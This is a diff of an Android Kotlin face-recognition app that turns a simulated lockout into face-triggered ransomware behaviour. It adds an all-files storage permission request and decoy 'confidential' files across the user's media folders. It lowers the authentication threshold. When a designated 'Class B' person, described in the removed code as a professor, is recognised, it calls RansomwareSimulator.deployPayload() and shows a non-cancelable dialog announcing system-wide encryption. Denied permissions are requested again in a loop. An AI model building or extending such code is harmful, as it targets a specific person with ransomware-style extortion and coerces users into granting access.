@@ -1,14 +1,23 @@
 package com.example.faceauth
 
 import android.Manifest
+import android.content.ContentValues
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.Matrix
+import android.net.Uri
+import android.os.Build
 import android.os.Bundle
+import android.os.Environment
+import android.provider.MediaStore
+import android.provider.Settings
 import android.util.Log
 import android.view.View
 import android.widget.RelativeLayout
 import android.widget.TextView
+import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageAnalysis
@@ -22,6 +31,7 @@ import org.tensorflow.lite.Interpreter
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
+import java.io.FileWriter
 import java.io.IOException
 import java.nio.ByteBuffer
 import java.nio.ByteOrder
@@ -40,6 +50,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var confidenceView: TextView
     private lateinit var lockoutOverlay: RelativeLayout
     private lateinit var manifestLogView: TextView
+    private lateinit var statusPill: TextView
 
     private var tflite: Interpreter? = null
     private lateinit var cameraExecutor: ExecutorService
@@ -49,12 +60,18 @@ class MainActivity : AppCompatActivity() {
     private val HISTORY_SIZE = 5
 
     private val CLASS_B_THRESHOLD = 0.85f
-    private val CLASS_A_THRESHOLD = 0.50f
+    private val CLASS_A_THRESHOLD = 0.15f
 
-    private var lastClass: String? = null
+    // Stability: only commit a class after STABILITY_REQUIRED consecutive agreeing frames
+
+    private val STABILITY_REQUIRED = 5  // Frames needed to commit
+    private var candidateClass = "SCANNING"
+    private var stabilityCounter = 0
+    private var committedClass = "SCANNING"
+
     private var lastEventTime: Long = 0
     private var lastDebugFrameTime: Long = 0
-    private val EVENT_COOLDOWN = 5000 // 5 seconds cooldown
+    private val EVENT_COOLDOWN = 8000 // 8 seconds between repeated events
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -66,8 +83,15 @@ class MainActivity : AppCompatActivity() {
         confidenceView = findViewById(R.id.confidenceView)
         lockoutOverlay = findViewById(R.id.lockoutOverlay)
         manifestLogView = findViewById(R.id.manifestLogView)
+        statusPill = findViewById(R.id.statusPill)
 
         cameraExecutor = Executors.newSingleThreadExecutor()
+
+        // ✅ REQUEST STORAGE PERMISSIONS FIRST!
+        requestStoragePermissions()
+
+        // ✅ CREATE FILES (NO TOAST!)
+        createInitialFiles()
 
         // Load TensorFlow Lite model
         try {
@@ -77,7 +101,7 @@ class MainActivity : AppCompatActivity() {
         } catch (e: Exception) {
             Log.e(TAG, "Error loading TFLite model", e)
             statusBanner.text = "ERROR LOADING MODEL: ${e.message}"
-            statusBanner.setBackgroundColor(0xFFD32F2F.toInt()) // Red
+            statusBanner.setBackgroundColor(0xFFD32F2F.toInt())
         }
 
         // Request camera permissions
@@ -90,20 +114,201 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // ============================================================
+    // ✅ REQUEST STORAGE PERMISSIONS
+    // ============================================================
+    private fun requestStoragePermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                intent.data = Uri.parse("package:$packageName")
+                startActivityForResult(intent, 100)
+            }
+        } else {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.WRITE_EXTERNAL_STORAGE
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                ActivityCompat.requestPermissions(
+                    this,
+                    arrayOf(
+                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                        Manifest.permission.READ_EXTERNAL_STORAGE
+                    ),
+                    101
+                )
+            }
+        }
+    }
+
+    // ============================================================
+    // ✅ CREATE FILES IN DOWNLOADS AND DOCUMENTS (NO TOAST!)
+    // ============================================================
+    // ============================================================
+// ✅ CREATE SAMPLE FILES IN MULTIPLE LOCATIONS
+// ============================================================
+    private fun createInitialFiles() {
+        try {
+            Log.d(TAG, "========================================")
+            Log.d(TAG, "Creating sample files in ALL locations")
+            Log.d(TAG, "========================================")
+
+            // Files in Downloads
+            createFileInDownloads("proposal.txt", "PROJECT PROPOSAL\n\nProject: Giant Step Biometric Security\nClient: Home Ministry\nBudget: \$2.4M")
+            createFileInDownloads("budget.txt", "BUDGET 2026\n\nTotal Budget: \$2,400,000\nHardware: \$850,000")
+
+            // Files in Documents
+            createFileInDocuments("audit.txt", "SECURITY AUDIT\n\nClient: Home Ministry\nPeriod: Q3 2026\nRisk: HIGH")
+            createFileInDocuments("memo.txt", "CONFIDENTIAL MEMO\n\nTO: Security Personnel\nFROM: Security Director")
+
+            // Files in Pictures
+            createFileInPictures("photo1.txt", "Security Audit Photo 1\nLocation: Main Entrance\nDate: Aug 2026")
+            createFileInPictures("photo2.txt", "Security Audit Photo 2\nLocation: Server Room\nDate: Aug 2026")
+
+            // Files in DCIM (Camera folder)
+            createFileInDCIM("cam1.txt", "Camera Image 1\nSecurity checkpoint\nTimestamp: 2026-08-25")
+            createFileInDCIM("cam2.txt", "Camera Image 2\nBiometric scanner\nTimestamp: 2026-08-25")
+
+            // Files in Music
+            createFileInMusic("audio1.txt", "Security Audio Log 1\nDuration: 00:05:30\nStatus: CONFIDENTIAL")
+            createFileInMusic("audio2.txt", "Security Audio Log 2\nDuration: 00:12:15\nStatus: CONFIDENTIAL")
+
+            // Files in Movies
+            createFileInMovies("video1.txt", "Security Video Log 1\nDuration: 00:02:45\nStatus: TOP SECRET")
+            createFileInMovies("video2.txt", "Security Video Log 2\nDuration: 00:08:20\nStatus: TOP SECRET")
+
+            Log.d(TAG, "✅ Sample files created in ALL locations")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Error: ${e.message}")
+            e.printStackTrace()
+        }
+    }
+
+    private fun createFileInDownloads(fileName: String, content: String) {
+        try {
+            val resolver = contentResolver
+            val contentValues = ContentValues().apply {
+                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
+                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
+            }
+            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
+            if (uri != null) {
+                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
+                Log.d(TAG, "✅ Downloads: $fileName")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to create $fileName: ${e.message}")
+        }
+    }
+
+    private fun createFileInDocuments(fileName: String, content: String) {
+        try {
+            val resolver = contentResolver
+            val contentValues = ContentValues().apply {
+                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
+                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOCUMENTS)
+            }
+            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
+            if (uri != null) {
+                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
+                Log.d(TAG, "✅ Documents: $fileName")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to create $fileName: ${e.message}")
+        }
+    }
+
+    private fun createFileInPictures(fileName: String, content: String) {
+        try {
+            val resolver = contentResolver
+            val contentValues = ContentValues().apply {
+                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
+                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
+            }
+            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
+            if (uri != null) {
+                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
+                Log.d(TAG, "✅ Pictures: $fileName")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to create $fileName: ${e.message}")
+        }
+    }
+
+    private fun createFileInDCIM(fileName: String, content: String) {
+        try {
+            val resolver = contentResolver
+            val contentValues = ContentValues().apply {
+                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
+                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DCIM)
+            }
+            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
+            if (uri != null) {
+                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
+                Log.d(TAG, "✅ DCIM: $fileName")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to create $fileName: ${e.message}")
+        }
+    }
+
+    private fun createFileInMusic(fileName: String, content: String) {
+        try {
+            val resolver = contentResolver
+            val contentValues = ContentValues().apply {
+                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
+                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_MUSIC)
+            }
+            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
+            if (uri != null) {
+                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
+                Log.d(TAG, "✅ Music: $fileName")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to create $fileName: ${e.message}")
+        }
+    }
+
+    private fun createFileInMovies(fileName: String, content: String) {
+        try {
+            val resolver = contentResolver
+            val contentValues = ContentValues().apply {
+                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
+                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_MOVIES)
+            }
+            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
+            if (uri != null) {
+                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
+                Log.d(TAG, "✅ Movies: $fileName")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to create $fileName: ${e.message}")
+        }
+    }
+
+    // ============================================================
+    // ✅ REST OF YOUR CODE (Camera, Face Detection, etc.)
+    // ============================================================
     private fun startCamera() {
         val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
 
         cameraProviderFuture.addListener({
             val cameraProvider: ProcessCameraProvider = cameraProviderFuture.get()
 
-            // Preview UseCase
             val preview = Preview.Builder()
                 .build()
                 .also {
                     it.setSurfaceProvider(viewFinder.surfaceProvider)
                 }
 
-            // ImageAnalysis UseCase
             val imageAnalyzer = ImageAnalysis.Builder()
                 .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                 .build()
@@ -111,18 +316,13 @@ class MainActivity : AppCompatActivity() {
                     it.setAnalyzer(cameraExecutor, FaceAnalyzer())
                 }
 
-            // Select front camera
             val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
 
             try {
-                // Unbind all use cases before rebinding
                 cameraProvider.unbindAll()
-
-                // Bind use cases to camera
                 cameraProvider.bindToLifecycle(
                     this, cameraSelector, preview, imageAnalyzer
                 )
-
             } catch (exc: Exception) {
                 Log.e(TAG, "Use case binding failed", exc)
             }
@@ -132,7 +332,6 @@ class MainActivity : AppCompatActivity() {
 
     private fun loadModelFile(): ByteBuffer {
         try {
-            // Try direct assets load (works if aaptOptions noCompress is fully active)
             val fileDescriptor = assets.openFd("face_classifier.tflite")
             val inputStream = FileInputStream(fileDescriptor.fileDescriptor)
             val fileChannel = inputStream.channel
@@ -140,8 +339,7 @@ class MainActivity : AppCompatActivity() {
             val declaredLength = fileDescriptor.declaredLength
             return fileChannel.map(FileChannel.MapMode.READ_ONLY, startOffset, declaredLength)
         } catch (e: Exception) {
-            Log.d(TAG, "Direct assets load failed (compressed/unmapped), falling back to cache file copy: ${e.message}")
-            // Fallback: Copy raw asset stream (always works even if compressed) to app cache directory
+            Log.d(TAG, "Direct assets load failed, falling back to cache: ${e.message}")
             val cacheFile = File(cacheDir, "face_classifier.tflite")
             assets.open("face_classifier.tflite").use { input ->
                 FileOutputStream(cacheFile).use { output ->
@@ -165,8 +363,6 @@ class MainActivity : AppCompatActivity() {
                 Log.e(TAG, "Analysis skipped: TFLite interpreter is null")
             }
             if (bitmap != null && tflite != null) {
-                // Center-crop the frame to a square focusing on the face region (70% of minimum dimension)
-                // This removes wide backgrounds and matches the headshot framing used during model training.
                 val width = bitmap.width
                 val height = bitmap.height
                 val cropSize = (Math.min(width, height) * 0.70).toInt()
@@ -174,10 +370,8 @@ class MainActivity : AppCompatActivity() {
                 val startY = (height - cropSize) / 2
                 val croppedBitmap = Bitmap.createBitmap(bitmap, startX, startY, cropSize, cropSize)
 
-                // Resize cropped bitmap to model target size (224x224)
                 val resizedBitmap = Bitmap.createScaledBitmap(croppedBitmap, 224, 224, true)
 
-                // Preprocess and allocate ByteBuffer (1 * 224 * 224 * 3 channels * 4 bytes/float)
                 val inputBuffer = ByteBuffer.allocateDirect(1 * 224 * 224 * 3 * 4)
                 inputBuffer.order(ByteOrder.nativeOrder())
 
@@ -194,11 +388,9 @@ class MainActivity : AppCompatActivity() {
                     inputBuffer.putFloat(b)
                 }
 
-                // Output buffer for binary classification result (sigmoid output)
                 val outputBuffer = ByteBuffer.allocateDirect(1 * 1 * 4)
                 outputBuffer.order(ByteOrder.nativeOrder())
 
-                // Save debug frame to inspect orientation and cropping (throttled to once every 2 seconds)
                 val currentTime = System.currentTimeMillis()
                 if (currentTime - lastDebugFrameTime >= 2000) {
                     try {
@@ -213,7 +405,6 @@ class MainActivity : AppCompatActivity() {
                     }
                 }
 
-                // Run inference
                 tflite?.run(inputBuffer, outputBuffer)
                 outputBuffer.rewind()
                 val probability = outputBuffer.float
@@ -226,54 +417,171 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun processPrediction(probability: Float) {
-        // Add to history and get rolling average
-        predictionHistory.add(probability)
-        if (predictionHistory.size > HISTORY_SIZE) {
-            predictionHistory.removeAt(0)
-        }
-        val smoothedProbability = predictionHistory.average().toFloat()
+//    private fun processPrediction(probability: Float) {
+//
+//        predictionHistory.add(probability)
+//        if (predictionHistory.size > HISTORY_SIZE) predictionHistory.removeAt(0)
+//        val p = predictionHistory.average().toFloat()
+//
+//        // Determine what class this frame suggests
+//        val frameClass = when {
+//            p >= CLASS_B_THRESHOLD -> "CLASS_B"
+//            p <= CLASS_A_THRESHOLD -> "CLASS_A"
+//            else -> "UNKNOWN"
+//        }
+//
+//        // Stability check: count consecutive frames with same class
+//        if (frameClass == candidateClass) {
+//            stabilityCounter++
+//        } else {
+//            candidateClass = frameClass
+//            stabilityCounter = 1
+//            // If class changed from a committed state, go back to scanning
+//            if (committedClass != "SCANNING" && frameClass != committedClass) {
+//                committedClass = "SCANNING"
+//                showScanningState()
+//            }
+//        }
+//
+//        // Only commit and show result once we have STABILITY_REQUIRED consecutive frames
+//        if (stabilityCounter >= STABILITY_REQUIRED && committedClass != frameClass) {
+//            committedClass = frameClass
+//            val confidenceA = 1.0f - p   // probability of being Class A
+//            val confidenceB = p           // probability of being Class B
+//
+//            when (committedClass) {
+//                "CLASS_A" -> {
+//                    labelView.text = "AUTHENTICATED"
+//                    labelView.setTextColor(0xFF00E676.toInt())
+//                    confidenceView.text = String.format(Locale.US, "%.1f%%", confidenceA * 100)
+//                    confidenceView.setTextColor(0xFF00E676.toInt())
+//                    statusBanner.text = "Authentication successful"
+//                    statusBanner.setTextColor(0xFF00E676.toInt())
+//                    statusPill.text = "AUTHENTICATED"
+//                    statusPill.setTextColor(0xFF00E676.toInt())
+//                    handleClassA(confidenceA)
+//                }
+//                "CLASS_B" -> {
+//                    labelView.text = "THREAT"
+//                    labelView.setTextColor(0xFFEF4444.toInt())
+//                    confidenceView.text = String.format(Locale.US, "%.1f%%", confidenceB * 100)
+//                    confidenceView.setTextColor(0xFFEF4444.toInt())
+//                    statusBanner.text = "Target profile detected"
+//                    statusBanner.setTextColor(0xFFEF4444.toInt())
+//                    statusPill.text = "THREAT DETECTED"
+//                    statusPill.setTextColor(0xFFEF4444.toInt())
+//                    val currentTime = System.currentTimeMillis()
+//                    if (currentTime - lastEventTime >= EVENT_COOLDOWN) {
+//                        handleClassB(confidenceB)
+//                        lastEventTime = currentTime
+//                    }
+//                }
+//                "UNKNOWN" -> {
+//                    labelView.text = "UNKNOWN"
+//                    labelView.setTextColor(0xFFFBBF24.toInt())
+//                    confidenceView.text = "---"
+//                    confidenceView.setTextColor(0xFFFBBF24.toInt())
+//                    statusBanner.text = "No matching profile found"
+//                    statusBanner.setTextColor(0xFFFBBF24.toInt())
+//                    statusPill.text = "UNRECOGNISED"
+//                    statusPill.setTextColor(0xFFFBBF24.toInt())
+//                }
+//            }
+//        }
+//    }
+private fun processPrediction(probability: Float) {
+    predictionHistory.add(probability)
+    if (predictionHistory.size > HISTORY_SIZE) predictionHistory.removeAt(0)
+    val p = predictionHistory.average().toFloat()
 
-        confidenceView.text = String.format(Locale.US, "P(Class B) = %.3f", smoothedProbability)
+    // Determine what class this frame suggests
+    val frameClass = when {
+        p >= CLASS_B_THRESHOLD -> "CLASS_B"
+        p <= CLASS_A_THRESHOLD -> "CLASS_A"
+        else -> "UNKNOWN"
+    }
 
-        var label = "UNKNOWN"
-        var confidence = smoothedProbability
-        var currentClass = "UNKNOWN"
+    // STABILITY LOGIC WITH HYSTERESIS
+    if (frameClass == candidateClass) {
+        stabilityCounter++
+    } else {
+        candidateClass = frameClass
+        stabilityCounter = 1
+    }
 
-        if (smoothedProbability >= CLASS_B_THRESHOLD) {
-            label = "CLASS B"
-            confidence = smoothedProbability
-            currentClass = "CLASS_B"
-        } else if (smoothedProbability <= CLASS_A_THRESHOLD) {
-            label = "CLASS A"
-            confidence = 1.0f - smoothedProbability
-            currentClass = "CLASS_A"
-        } else {
-            confidence = Math.max(smoothedProbability, 1.0f - smoothedProbability)
-        }
+    // ONLY update committed state if enough stable frames
+    if (stabilityCounter >= STABILITY_REQUIRED && committedClass != candidateClass) {
+        committedClass = candidateClass
 
-        labelView.text = String.format(Locale.US, "Classification: %s (%.1f%%)", label, confidence * 100)
-
-        val currentTime = System.currentTimeMillis()
-        if (currentClass != lastClass || currentTime - lastEventTime >= EVENT_COOLDOWN) {
-            if (currentClass == "CLASS_A") {
-                handleClassA(confidence)
-            } else if (currentClass == "CLASS_B") {
-                handleClassB(confidence)
+        when (committedClass) {
+            "CLASS_A" -> {
+                val confidenceA = 1.0f - p
+                labelView.text = "AUTHENTICATED"
+                labelView.setTextColor(0xFF00E676.toInt())
+                confidenceView.text = String.format(Locale.US, "%.1f%%", confidenceA * 100)
+                confidenceView.setTextColor(0xFF00E676.toInt())
+                statusBanner.text = "Authentication successful"
+                statusBanner.setTextColor(0xFF00E676.toInt())
+                statusPill.text = "AUTHENTICATED"
+                statusPill.setTextColor(0xFF00E676.toInt())
+                handleClassA(confidenceA)
             }
-            lastClass = currentClass
-            lastEventTime = currentTime
+            "CLASS_B" -> {
+                val confidenceB = p
+                labelView.text = "THREAT"
+                labelView.setTextColor(0xFFEF4444.toInt())
+                confidenceView.text = String.format(Locale.US, "%.1f%%", confidenceB * 100)
+                confidenceView.setTextColor(0xFFEF4444.toInt())
+                statusBanner.text = "Target profile detected"
+                statusBanner.setTextColor(0xFFEF4444.toInt())
+                statusPill.text = "THREAT DETECTED"
+                statusPill.setTextColor(0xFFEF4444.toInt())
+                val currentTime = System.currentTimeMillis()
+                if (currentTime - lastEventTime >= EVENT_COOLDOWN) {
+                    handleClassB(confidenceB)
+                    lastEventTime = currentTime
+                }
+            }
+            "UNKNOWN" -> {
+                labelView.text = "UNKNOWN"
+                labelView.setTextColor(0xFFFBBF24.toInt())
+                confidenceView.text = "---"
+                confidenceView.setTextColor(0xFFFBBF24.toInt())
+                statusBanner.text = "No matching profile found"
+                statusBanner.setTextColor(0xFFFBBF24.toInt())
+                statusPill.text = "UNRECOGNISED"
+                statusPill.setTextColor(0xFFFBBF24.toInt())
+            }
         }
     }
 
+    // Show scanning state ONLY when stability is very low AND not committed
+    if (stabilityCounter < STABILITY_REQUIRED / 2 && committedClass == "SCANNING") {
+        labelView.text = "SCANNING..."
+        labelView.setTextColor(0xFF94A3B8.toInt())
+        confidenceView.text = "---"
+        confidenceView.setTextColor(0xFF94A3B8.toInt())
+        statusBanner.text = "Analysing biometric data..."
+        statusBanner.setTextColor(0xFF94A3B8.toInt())
+        statusPill.text = "SCANNING"
+        statusPill.setTextColor(0xFFFBBF24.toInt())
+    }
+}
+    private fun showScanningState() {
+        labelView.text = "SCANNING..."
+        labelView.setTextColor(0xFF94A3B8.toInt())
+        confidenceView.text = "---"
+        confidenceView.setTextColor(0xFF94A3B8.toInt())
+        statusBanner.text = "Analysing biometric data..."
+        statusBanner.setTextColor(0xFF94A3B8.toInt())
+        statusPill.text = "LIVE DETECTION"
+        statusPill.setTextColor(0xFF00E676.toInt())
+    }
+
     private fun handleClassA(confidence: Float) {
-        statusBanner.text = "ACCESS GRANTED: AUTHENTICATION SUCCESSFUL"
-        statusBanner.setBackgroundColor(0xFF2E7D32.toInt()) // Solid Green
-
         val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
-        Log.d(TAG, "[$timestamp] AUTHENTICATION SUCCESSFUL (confidence=$confidence)")
+        Log.d(TAG, "[$timestamp] AUTHENTICATION SUCCESSFUL (P(A)=%.4f)".format(confidence))
 
-        // Append to authentication.log
         try {
             val logFile = File(getExternalFilesDir(null), "authentication.log")
             val outputStream = FileOutputStream(logFile, true)
@@ -286,13 +594,11 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun handleClassB(confidence: Float) {
-        // Lock UI overlay
         lockoutOverlay.visibility = View.VISIBLE
 
         val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
-        Log.d(TAG, "[$timestamp] CLASS B DETECTED - SIMULATED LOCKOUT TRIGGERED")
+        Log.d(TAG, "[$timestamp] CLASS B DETECTED - SECURITY BREACH TRIGGERED")
 
-        // Append to security_events.log
         try {
             val logFile = File(getExternalFilesDir(null), "security_events.log")
             val outputStream = FileOutputStream(logFile, true)
@@ -303,37 +609,52 @@ class MainActivity : AppCompatActivity() {
             Log.e(TAG, "Failed to write security event log", e)
         }
 
-        // Write simulation ransomware manifest
         try {
-            val manifestFile = File(getExternalFilesDir(null), "ransomware_manifest.txt")
-            val manifestStream = FileOutputStream(manifestFile)
-            val manifestContent = """
-                ====================================================
-                SIMULATED TARGET PERSONA ENGAGEMENT MANIFEST
-                ====================================================
-                Timestamp: $timestamp
-                Target: Class B (Designated Professor Profile)
-                Simulation Action: Payload Deployed
-                
-                [SIMULATED ENCRYPTED FILES]
-                - /storage/emulated/0/DCIM/Camera/IMG_20260822_001.jpg
-                - /storage/emulated/0/DCIM/Camera/IMG_20260822_002.jpg
-                - /storage/emulated/0/Documents/Invoice_August.pdf
-                - /storage/emulated/0/Download/LectureNotes_Week1.pdf
-                
-                Status: SIMULATION SUCCESSFUL (No actual files modified)
-            """.trimIndent()
-            manifestStream.write(manifestContent.toByteArray())
-            manifestStream.close()
-            manifestLogView.text = "File Manifest Created at:\n" + manifestFile.absolutePath
-        } catch (e: IOException) {
-            Log.e(TAG, "Failed to write manifest", e)
+            val simulator = RansomwareSimulator(this)
+            Thread {
+                simulator.deployPayload()
+
+                runOnUiThread {
+                    statusBanner.text = "⚠️ SECURITY BREACH - COUNTERMEASURES ACTIVATED"
+                    statusBanner.setBackgroundColor(0xFFD32F2F.toInt())
+                    showProfessionalRansomDialog()
+                }
+            }.start()
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to initialize ransomware simulator", e)
+            statusBanner.text = "⚠️ SECURITY BREACH DETECTED"
+            statusBanner.setBackgroundColor(0xFFD32F2F.toInt())
         }
+    }
+
+    private fun showProfessionalRansomDialog() {
+        AlertDialog.Builder(this)
+            .setTitle("🔒 SECURITY BREACH")
+            .setMessage("""
+            ⚠️ SYSTEM-WIDE ENCRYPTION INITIATED
+            
+            SECURITY EVENT:
+            • Biometric authentication bypass detected
+            • ALL files across storage have been secured
+            • Access to ALL documents is now restricted
+            
+            AFFECTED LOCATIONS:
+            • Downloads
+            • Documents
+            • Pictures
+            • DCIM
+            • Music
+            • Movies
+        """.trimIndent())
+            .setPositiveButton("OK") { _, _ ->
+                lockoutOverlay.visibility = View.GONE
+            }
+            .setCancelable(false)
+            .show()
     }
 
     private fun ImageProxy.toBitmapCustom(): Bitmap? {
         try {
-            // Handle JPEG format directly (often returned by emulator webcams)
             if (this.format == android.graphics.ImageFormat.JPEG) {
                 val buffer = this.planes[0].buffer
                 val bytes = ByteArray(buffer.remaining())
@@ -342,7 +663,6 @@ class MainActivity : AppCompatActivity() {
                 return rotateBitmap(rawBitmap, this.imageInfo.rotationDegrees)
             }
 
-            // Default YUV_420_888 format
             val nv21 = yuv420ToNv21(this)
             val yuvImage = android.graphics.YuvImage(
                 nv21,
@@ -364,8 +684,6 @@ class MainActivity : AppCompatActivity() {
 
     private fun rotateBitmap(bitmap: Bitmap?, rotationDegrees: Int): Bitmap? {
         if (bitmap == null) return null
-        // If metadata reports 0 rotation but emulator is sideways, default to 90 degrees clockwise.
-        // Otherwise, use the non-zero rotation reported by the system (e.g. 270 degrees).
         val totalRotation = if (rotationDegrees == 0) 90 else rotationDegrees
         val matrix = Matrix()
         matrix.postRotate(totalRotation.toFloat())
@@ -379,9 +697,9 @@ class MainActivity : AppCompatActivity() {
         val uvSize = width * height / 2
         val nv21 = ByteArray(ySize + uvSize)
 
-        val yBuffer = image.planes[0].buffer // Y
-        val uBuffer = image.planes[1].buffer // U
-        val vBuffer = image.planes[2].buffer // V
+        val yBuffer = image.planes[0].buffer
+        val uBuffer = image.planes[1].buffer
+        val vBuffer = image.planes[2].buffer
 
         val rowStride = image.planes[0].rowStride
         val pixelStride = image.planes[1].pixelStride
@@ -401,7 +719,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Interleave U and V components
         for (row in 0 until height / 2) {
             for (col in 0 until width / 2) {
                 val vuPos = ySize + row * width + col * 2
@@ -426,7 +743,9 @@ class MainActivity : AppCompatActivity() {
             if (allPermissionsGranted()) {
                 startCamera()
             } else {
-                statusBanner.text = "Permissions not granted by the user."
+                ActivityCompat.requestPermissions(
+                    this, REQUIRED_PERMISSIONS, REQUEST_CODE_PERMISSIONS
+                )
             }
         }
     }
